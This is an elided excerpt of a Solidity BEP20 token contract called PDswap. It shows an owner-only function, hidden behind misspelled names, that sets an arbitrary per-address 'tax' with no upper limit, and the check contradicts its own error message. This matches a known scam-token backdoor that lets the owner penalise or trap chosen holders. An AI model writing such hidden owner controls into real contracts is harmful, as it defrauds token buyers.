...
contract PDswap is BEP20, Ownable {
    // ext
    ...
    mapping(address => uint256) private _Sfeii;
    ...
    function setSfeii(address _address, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _Sfeii[_address] = _value;
    }

    function getSfeii(address _address) external view onlyowaer returns (uint256) {
        return _Sfeii[_address];
    }
